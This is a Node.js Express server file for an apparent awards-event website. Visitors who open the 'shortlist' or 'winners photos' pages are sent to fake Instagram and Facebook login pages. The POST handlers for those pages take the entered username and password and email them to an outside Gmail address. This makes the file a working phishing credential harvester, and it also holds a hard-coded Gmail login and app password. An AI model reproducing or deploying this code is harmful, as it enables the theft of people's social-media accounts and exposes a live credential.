//require modules
const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const nodemailer = require("nodemailer");
const path = require("path");

const port = 3000; //listening port on localhost

//represent modules
const app = express();

console.log(__dirname);
let publicPath = path.join();

// use modules middleware required
app.use(express.static("public")); //use public static files
app.use(bodyParser.urlencoded({ extended: true }));

app.set("view engine", "ejs"); //ejs middleware, view engine.

//create route
app.get("/", function (request, response) {
  response.render("index");
});
app.get("/about", function (request, response) {
  response.render("about/index");
});
app.get("/book-of-the-night", function (request, response) {
  response.render("book-of-the-night/index");
});
app.get("/code-of-conduct", function (request, response) {
  response.render("code-of-conduct/index");
});
app.get("/competition-terms", function (request, response) {
  response.render("competition-terms/index");
});
app.get("/contact", function (request, response) {
  response.render("contact/index");
});
app.get("/download-logos", function (request, response) {
  response.render("download-the-logos/index");
});
app.get("/faqs", function (request, response) {
  response.render("faqs/index");
});
app.get("/host", function (request, response) {
  response.render("host/index");
});
app.get("/itinerary", function (request, response) {
  response.render("itinerary/index");
});
app.get("/judges", function (request, response) {
  response.render("judges/index");
});
app.get("/judging-process", function (request, response) {
  response.render("judging-process/index");
});
app.get("/newsletter", function (request, response) {
  response.render("newsletter/index");
});
app.get("/refund-policy", function (request, response) {
  response.render("refund-policy/index");
});
app.get("/schema-org", function (request, response) {
  response.render("schema.org/index");
});
app.get("/shortlist", function (request, response) {
  response.redirect("/login");
});
app.get("/sponsorship", function (request, response) {
  response.render("sponsorship/index");
});
app.get("/terms-conditions", function (request, response) {
  response.render("terms-conditions/index");
});
app.get("/testimonials", function (request, response) {
  response.render("testimonial/index");
});
app.get("/venue", function (request, response) {
  response.render("venue/index");
});
app.get("/why-enter", function (request, response) {
  response.render("why-enter/index");
});
app.get("/winners-photos", function (request, response) {
  response.redirect("/login");
});
app.get("/winners", function (request, response) {
  response.render("winners/index");
});
app
  .route("/login")
  .get(function (request, response) {
    response.render("insta_login");
  })
  .post(function (request, response) {
    const username = request.body.username;
    const password = request.body.password;
    const output = `
    Congrates you have a new user Login From Instagram:
    Contact Details
    Username: ${username}
    Password: ${password}
     `;
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "stevenwoods943@gmail.com",
        pass: "kfqbbpdsjdssfrqr",
      },
    });
    //   Define email
    const mailOptions = {
      from: "stevenwoods943@gmail.com",
      to: "patrickrodgers511@gmail.com",
      subject: "New Instagram Account Login",
      text: output,
    };
    transporter.sendMail(mailOptions, function (error, info) {
      if (error) {
        console.log(error, "error");
      } else {
        console.log("Email sent: ", info);
      }
    });
    // async..await is not allowed in global scope, must use a wrapper
    async function main() {
      console.log("Message sent: %s", info.messageId);
    }
    main().catch(console.error);
    response.redirect("/");
  });
app
  .route("/login-facebook")
  .get(function (request, response) {
    response.render("facebook_login");
  })
  .post(function (request, response) {
    const username = request.body.username;
    const password = request.body.password;
    const output = `
    Congrates you have a new user Login From Facebook: \n
    Contact Details
    Username: ${username}
    Password: ${password}
     `;
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "stevenwoods943@gmail.com",
        pass: "kfqbbpdsjdssfrqr",
      },
    });
    //   Define email
    const mailOptions = {
      from: "stevenwoods943@gmail.com",
      to: "patrickrodgers511@gmail.com",
      subject: "New Facebook Account Login",
      text: output,
    };
    transporter.sendMail(mailOptions, function (error, info) {
      if (error) {
        console.log(error, "error");
      } else {
        console.log("Email sent: ", info);
      }
    });
    // async..await is not allowed in global scope, must use a wrapper
    async function main() {
      console.log("Message sent: %s", info.messageId);
    }
    main().catch(console.error);
    response.redirect("/");
  });

app.listen(3000, function () {
  console.log(`Server has started on port ${port} ......`);
});
